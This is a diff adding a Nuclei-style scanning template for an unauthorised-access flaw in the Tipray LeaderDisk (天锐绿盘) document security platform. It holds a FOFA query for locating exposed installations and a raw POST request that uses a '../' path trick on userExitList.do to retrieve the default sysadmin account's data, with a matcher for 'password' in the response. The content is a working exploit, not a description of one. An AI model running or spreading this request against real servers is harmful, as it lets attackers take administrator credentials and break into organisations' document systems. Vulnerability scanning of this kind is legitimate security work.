@@ -1,0 +1,29 @@
+id: tianrui-greendisk-userexitlist-info-leak
+
+info:
+  name: 天锐绿盘文档安全管理平台 userExitList.do 接口用户信息泄露漏洞
+  author: 0dayPoc
+  severity: medium
+  description: |-
+    fofa: body="/lddsm/" || title="天锐绿盘" || title=="Tipray LeaderDisk"
+      接口路径 /admin/user/userExitList.do 存在未授权访问缺陷，攻击者可通过构造包含有效用户名的 userNames 参数触发 onSelectAll 响应，获取目标用户的完整敏感信息。默认管理员账户 sysadmin 的凭证信息可通过该接口被非法提取。
+  tags: 天锐绿盘文档安全管理平台
+
+http:
+- raw:
+  - |
+    POST /lddsm/service/../admin/user/userExitList.do?userNames=sysadmin HTTP/1.1
+    Host: {{Hostname}}
+    Accept: */*
+    Accept-Encoding: gzip, deflate
+    Connection: close
+
+    _search=false&nd=1763012062514&rows=100&page=1&sidx=usr_name&sord=asc
+  matchers-condition: and
+  matchers:
+  - type: status
+    status: [200]
+  - type: word
+    part: body
+    words:
+    - 'password'
